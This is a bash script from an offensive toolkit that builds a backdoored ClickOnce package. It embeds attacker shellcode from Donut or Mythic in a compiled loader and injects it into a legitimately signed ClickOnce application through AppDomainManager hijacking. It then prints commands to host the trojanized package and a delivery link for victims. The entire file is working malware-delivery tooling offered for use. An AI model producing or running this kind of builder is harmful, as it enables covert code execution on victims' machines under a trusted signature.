#!/bin/bash
# ClickOnce Payload Builder — NotNemesis Integration
# Usage: ./build_clickonce_payload.sh <shellcode.bin> <clickonce_app_dir> <hosting_url> [output_dir]
#
# Pipeline:
#   1. Takes raw shellcode (.bin) from Donut/Mythic
#   2. Compiles ShellcodeLoader.cs with embedded shellcode (via mcs/csc)
#   3. Injects into signed ClickOnce application via AppDomainManager hijacking
#   4. Outputs ready-to-host ClickOnce package
#
# Prerequisites:
#   - Mono mcs (Linux) or csc.exe (Windows)
#   - A downloaded signed ClickOnce .application directory
#   - Python 3.10+ with semver (pip install semver)

set -euo pipefail

RED='\033[91m'; GREEN='\033[92m'; CYAN='\033[96m'; RESET='\033[0m'
log() { echo -e "${CYAN}[*]${RESET} $1"; }
ok()  { echo -e "${GREEN}[+]${RESET} $1"; }
err() { echo -e "${RED}[-]${RESET} $1" >&2; exit 1; }

SHELLCODE="${1:?Usage: $0 <shellcode.bin> <clickonce_app_dir> <hosting_url> [output_dir]}"
APP_DIR="${2:?Missing ClickOnce app directory}"
HOSTING_URL="${3:?Missing hosting URL}"
OUTPUT_DIR="${4:-./clickonce_output}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Validate inputs
[[ -f "$SHELLCODE" ]] || err "Shellcode file not found: $SHELLCODE"
[[ -d "$APP_DIR" ]] || err "ClickOnce app directory not found: $APP_DIR"

# Find .application file
APP_FILE=$(find "$APP_DIR" -maxdepth 1 -name "*.application" | head -1)
[[ -n "$APP_FILE" ]] || err "No .application file found in $APP_DIR"

SC_SIZE=$(stat -c%s "$SHELLCODE")
log "Shellcode: $SHELLCODE ($SC_SIZE bytes)"
log "ClickOnce app: $APP_FILE"
log "Hosting URL: $HOSTING_URL"
log "Output: $OUTPUT_DIR"

# Run ClickOnceBlobber with shellcode mode
log "Running ClickOnceBlobber..."
python3 "$SCRIPT_DIR/clickonce_backdoor.py" \
    --input "$APP_FILE" \
    --url "$HOSTING_URL" \
    --shellcode "$SHELLCODE" \
    --platform x64 \
    --output "$OUTPUT_DIR"

ok "ClickOnce package ready at: $OUTPUT_DIR"
echo ""
echo "  Serve:   python3 $SCRIPT_DIR/clickonce_backdoor.py serve --port 8080 --dir $OUTPUT_DIR"
echo "  Deliver:  $HOSTING_URL/$(basename "$APP_FILE")"
echo ""
